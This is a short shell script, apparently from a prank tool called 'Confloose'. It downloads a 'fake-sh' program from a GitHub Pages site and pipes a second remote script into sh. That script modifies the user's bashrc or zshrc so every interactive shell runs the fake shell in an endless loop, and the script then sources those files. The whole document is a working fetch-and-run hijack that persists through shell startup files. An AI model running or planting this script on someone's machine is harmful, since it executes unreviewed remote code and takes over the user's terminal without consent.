#!/bin/sh

tempdir=$(mktemp -d)

curl "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/fake-sh/sh.sh" >> "$tempdir/sh"
chmod +x "$tempdir/sh"

echo $(curl "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-sh" "'if [ -n \"\$PS1\" ]; then while true; do $tempdir/sh; done; fi'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
